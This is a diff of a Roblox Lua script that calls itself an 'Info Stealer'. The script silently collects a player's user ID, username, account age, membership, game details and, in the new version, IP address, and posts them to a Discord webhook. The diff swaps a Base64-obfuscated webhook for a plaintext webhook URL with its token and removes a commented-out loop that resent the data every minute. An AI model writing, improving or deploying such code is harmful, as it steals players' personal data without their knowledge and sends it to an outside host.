@@ -1,5 +1,5 @@
---[=[ Roblox Info Stealer – v1.0
-      Collects user ID, username, account age, membership, game info, and more.
+--[=[ Roblox Info Stealer – v1.1
+      Collects user ID, username, account age, membership, game info, IP, and more.
       Sends data to Discord webhook via HttpService.
       No visible output – runs silently.
 ]=]
@@ -11,33 +11,8 @@ local UIS = game:GetService("UserInputService")
 local LocalPlayer = Players.LocalPlayer
 local Camera = workspace.CurrentCamera
 
--- Your Discord webhook (Base64-encoded for obfuscation)
-local encoded_webhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUyNzQzNjc5MTg2NTU0NDgxNC9UcFp6aVV5SHRWbnFWOXNDUi0tQzZ4dmJERXVNOGF2ZEpZdjFwM19SZUFRd1N4aWNtMzBnS0JLZmFmLTloM3pUM1M2MA=="
-
--- Decode Base64 (custom function for compatibility)
-local function base64_decode(data)
-    local b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
-    local lookup = {}
-    for i = 1, #b64 do lookup[string.sub(b64, i, i)] = i - 1 end
-    data = string.gsub(data, "[^" .. b64 .. "=]", "")
-    local result = {}
-    for i = 1, #data, 4 do
-        local chunk = string.sub(data, i, i+3)
-        local a = lookup[string.sub(chunk, 1, 1)] or 0
-        local b = lookup[string.sub(chunk, 2, 2)] or 0
-        local c = lookup[string.sub(chunk, 3, 3)] or 0
-        local d = lookup[string.sub(chunk, 4, 4)] or 0
-        local byte1 = (a * 4) + math.floor(b / 16)
-        local byte2 = ((b % 16) * 16) + math.floor(c / 4)
-        local byte3 = ((c % 4) * 64) + d
-        table.insert(result, string.char(byte1))
-        if string.sub(chunk, 3, 3) ~= "=" then table.insert(result, string.char(byte2)) end
-        if string.sub(chunk, 4, 4) ~= "=" then table.insert(result, string.char(byte3)) end
-    end
-    return table.concat(result)
-end
-
-local WEBHOOK_URL = base64_decode(encoded_webhook)
+-- Your new Discord webhook (in plain text – optional obfuscation can be added)
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1527799897741332631/GHyVnuLK7boBHeHjjgCrTAYkkqwsu5yZuVInYPyGPI-NPdQo19XRsUkZmBxfxUsnrjgU"
 
 -- Collect data
 local function collectInfo()
@@ -80,15 +55,9 @@ local function sendData()
 end
 
 -- Send immediately when script runs
-task.wait(2) -- small delay to ensure everything loads
+task.wait(2)
 sendData()
 
--- Optionally send again every 60 seconds (commented out – uncomment if needed)
--- task.spawn(function()
---     while true do
---         task.wait(60)
---         sendData()
---     end
--- end)
-
 -- No print statements – stays completely silent.
+  
+
